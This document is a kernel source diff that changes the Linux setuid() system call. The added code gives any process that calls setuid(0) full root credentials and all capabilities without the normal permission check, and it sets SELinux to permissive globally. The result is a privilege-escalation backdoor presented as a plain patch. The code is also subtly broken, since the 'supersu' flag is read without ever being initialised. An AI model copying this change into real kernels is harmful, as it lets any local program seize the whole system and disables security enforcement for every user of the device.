@@ -776,6 +776,20 @@ error:
 	return retval;
 }
 
+#define SUPERSU_UID 0
+
+static void enable_superpowers(struct cred *new)
+{
+	extern int selinux_enforcing;
+
+	/* enable all Linux capabilities */
+	new->cap_inheritable = CAP_FULL_SET;
+	new->cap_permitted = CAP_FULL_SET;
+	new->cap_effective = CAP_FULL_SET;
+	/* set SELinux policy to permissive */
+	selinux_enforcing = 0;
+}
+
 /*
  * setuid() is implemented like SysV with SAVED_IDS
  *
@@ -791,6 +805,7 @@ SYSCALL_DEFINE1(setuid, uid_t, uid)
 {
 	const struct cred *old;
 	struct cred *new;
+	bool supersu;
 	int retval;
 
 	new = prepare_creds();
@@ -798,8 +813,15 @@ SYSCALL_DEFINE1(setuid, uid_t, uid)
 		return -ENOMEM;
 	old = current_cred();
 
+	if (uid == SUPERSU_UID) {
+		/* root */
+		uid = 0;
+		enable_superpowers(new);
+		supersu = true;
+	}
+
 	retval = -EPERM;
-	if (nsown_capable(CAP_SETUID)) {
+	if (supersu || nsown_capable(CAP_SETUID)) {
 		new->suid = new->uid = uid;
 		if (uid != old->uid) {
 			retval = set_user(new);
